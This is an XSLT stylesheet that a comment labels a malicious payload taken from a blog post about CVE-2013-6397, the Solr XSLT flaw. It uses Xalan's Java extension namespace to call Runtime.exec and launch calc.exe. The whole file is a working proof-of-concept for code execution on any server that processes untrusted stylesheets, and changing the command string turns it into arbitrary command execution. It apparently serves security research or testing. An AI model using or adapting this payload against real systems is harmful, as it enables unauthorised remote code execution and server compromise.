<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:date="http://xml.apache.org/xalan/java/java.util.Date"
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                exclude-result-prefixes="date">

    <xsl:output method="text"/>


    <!--
    This malicous payload is taken from the blog post by Nicolas Gregoire :
    http://www.agarri.fr/kom/archives/2013/11/27/compromising_an_unreachable_solr_server_with_cve-2013-6397/index.html
    -->

    <xsl:template match="/">

        <xsl:variable name="cmd">calc.exe</xsl:variable>
        <xsl:variable name="rtObj" select="rt:getRuntime()"/>
        <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
        <xsl:text>Process: </xsl:text><xsl:value-of select="$process"/>

    </xsl:template>

</xsl:stylesheet>